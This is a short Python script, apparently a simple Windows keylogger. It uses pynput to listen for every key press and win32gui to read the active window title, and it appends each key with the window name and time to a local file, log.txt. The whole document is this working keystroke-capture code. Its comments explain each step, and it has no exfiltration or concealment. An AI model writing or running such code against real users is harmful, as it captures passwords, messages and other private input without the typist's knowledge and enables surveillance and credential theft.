#import all the modules that are needed

from pynput.keyboard import Key,Listener
from win32gui import GetWindowText, GetForegroundWindow
from datetime import datetime
import os.path

#Check if log.txt already exists if it doesnt then make a log.txt

if not os.path.isfile('log.txt'):
    makelog = open('log.txt', 'w')
    makelog.close()

#Open log.txt and write [EXECUTION HAS STARTED...] and ACTIVE WINDOW\t|\tHOUR:MINUTES:SECONDS\t|\tKEYS\n in the file

with open('log.txt','a') as log:
        log.write("[EXECUTION HAS STARTED...]\n")
        log.write("ACTIVE WINDOW\t|\tHOUR:MINUTES:SECONDS\t|\tKEYS\n")
        log.close()

#Function which opens log.txt and writes the key along with the time it was typed and on which window it was typed

def on_press(key):
        with open('log.txt','a') as log:
            log.write((
f"{str(GetWindowText(GetForegroundWindow()).encode('ascii', 'ignore'),'utf-8')[:25]:<25}"
"  |  "
f"{datetime.now().strftime('%H:%M:%S')}" #most of this is just formatting and dealing with unicode chracters
"  |  "
f"{key}\n"))
                
#Activates when a key is pressed and calls on_press(key)
                
with Listener(on_press = on_press) as Listner:
        Listner.join()
